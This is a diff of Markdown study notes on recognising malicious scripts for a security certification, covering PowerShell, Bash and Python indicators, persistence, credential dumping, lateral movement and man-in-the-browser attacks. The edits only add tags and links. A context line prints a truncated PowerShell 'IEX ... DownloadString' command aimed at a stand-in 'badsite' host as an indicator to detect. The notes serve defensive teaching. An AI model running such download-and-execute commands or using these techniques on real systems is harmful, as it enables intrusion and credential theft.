@@ -1,11 +1,11 @@
 # EXAM OBJECTIVES COVERED
 
 1.4 Given a scenario, analyze #Ops potential indicators associated with network attacks
-
+#attack , #threat , #vulnerability 
 3.2 Given a scenario, implement host or application security solutions
-
+#Implementation 
 4.1 Given a scenario, use the appropriate tool to assess organizational security
-
+#Ops 
 As a security technician, you will often have to develop automation scripts, using a range of programming and scripting languages. Scripts can be used to return critical [[security assessment]] data and to configure hosts, so it is important that only validated code can be executed. You should also be able to identify malicious code in scripts and macros.
 # SCRIPTING
 
@@ -180,7 +180,7 @@ As with **buffer overflow, indicators of malicious code execution are either cau
 -   **Shellcode**—this is a minimal program designed to exploit a buffer overflow or similar vulnerability to gain privileges, or to drop a backdoor on the host if run as a Trojan ([attack.mitre.org/tactics/TA0002](https://attack.mitre.org/tactics/TA0002/)). Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
 -   **Credential dumping**—the malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process ([attack.mitre.org/tactics/TA0006](https://attack.mitre.org/tactics/TA0006/)).
 -   **Lateral movement/insider attack**—the general procedure is to use the foothold to execute a process remotely, using a tool such as psexec ([docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)) or PowerShell ([attack.mitre.org/tactics/TA0008](https://attack.mitre.org/tactics/TA0008/)). The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.
--   **Persistence**—this is a mechanism that allows the [[threat actor]]'s backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.
+-   **Persistence**—this is a mechanism that allows the [[threat actor]]'s backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation ([[WMI]]) event subscriptions.
 # POWERSHELL MALICIOUS INDICATORS
 
 There are numerous exploit frameworks to leverage PowerShell functionality, such as PowerShell Empire, PowerSploit, Metasploit, and Mimikatz. **Some suspicious indicators** for PowerShell execution include the following:
@@ -196,7 +196,7 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://badsite.f
 
 -   **Using another type of script** to execute the PowerShell is also suspicious. For example, the attacker might use JavaScript code embedded in a PDF to launch PowerShell via a vulnerable reader app.
 
-The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following [[techniques]] can be used to assist with this:
+The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following #techniques can be used to assist with this:
 
 -   Use **group policy to restrict** execution of PowerShell to trusted accounts and hosts.
 -   Use **group policy execution** control to run scripts only from trusted locations.
@@ -207,7 +207,7 @@ The big problem with PowerShell indicators is distinguishing them from legitimat
 Symantec's white paper contains a useful introduction to PowerShell exploits ([docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)).
 # BASH AND PYTHON MALICIOUS INDICATORS
 
-Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or vulnerabilities in web applications. In Linux, the command line is usually Bourne Again Shell ([[Bash]]). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.
+Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or [[vulnerability|vulnerabilities]] in web applications. In Linux, the command line is usually Bourne Again Shell ([[Bash]]). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.
 
 A [[malicious script]] running on a Linux host might attempt the following:
 
@@ -250,7 +250,7 @@ With PDF, the JavaScript might be embedded within the document and designed to e
 
 A man-in-the-browser ([[MitB]]) attack is a specific type of [[on-path]] attack where the web browser is compromised. Depending on the level of privilege obtained, the attacker may be able to inspect session cookies, certificates, and data, change browser settings, perform redirection, and inject code.
 
-A MitB attack may be accomplished by installing malicious plug-ins or scripts or intercepting calls between the browser process and [[DLLs]] ([attack.mitre.org/techniques/T1185](https://attack.mitre.org/techniques/T1185/)). The Browser Exploitation Framework ([[BeEF]]) ([beefproject.com](https://beefproject.com/)) is one well known MitB tool. There are various vulnerability exploit kits that can be installed to a website to actively try to exploit vulnerabilities in clients browsing the site ([trendmicro.com/vinfo/ie/security/definition/exploit-kit](https://www.trendmicro.com/vinfo/ie/security/definition/exploit-kit)). These kits may either be installed to a legitimate site without the owner's knowledge (by compromising access control on the web server) and load in an iFrame (invisible to the user), or the attacker may use phishing/[[Social engineering]] techniques to trick users into visiting the site.
+A MitB attack may be accomplished by installing malicious plug-ins or scripts or intercepting calls between the browser process and [[DLLs]] ([attack.mitre.org/techniques/T1185](https://attack.mitre.org/techniques/T1185/)). The Browser Exploitation Framework ([[BeEF]]) ([beefproject.com](https://beefproject.com/)) is one well known MitB tool. There are various vulnerability exploit kits that can be installed to a website to actively try to exploit [[vulnerability|vulnerabilities]] in clients browsing the site ([trendmicro.com/vinfo/ie/security/definition/exploit-kit](https://www.trendmicro.com/vinfo/ie/security/definition/exploit-kit)). These kits may either be installed to a legitimate site without the owner's knowledge (by compromising access control on the web server) and load in an iFrame (invisible to the user), or the attacker may use phishing/[[Social engineering]] techniques to trick users into visiting the site.
 
 ![Browser Exploitation Framework (BeEF) window showing a hooked browser at IP address 10.1.0.101 and details of browser software, version, and loaded plug-ins.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/787-1599771809708.png)
 
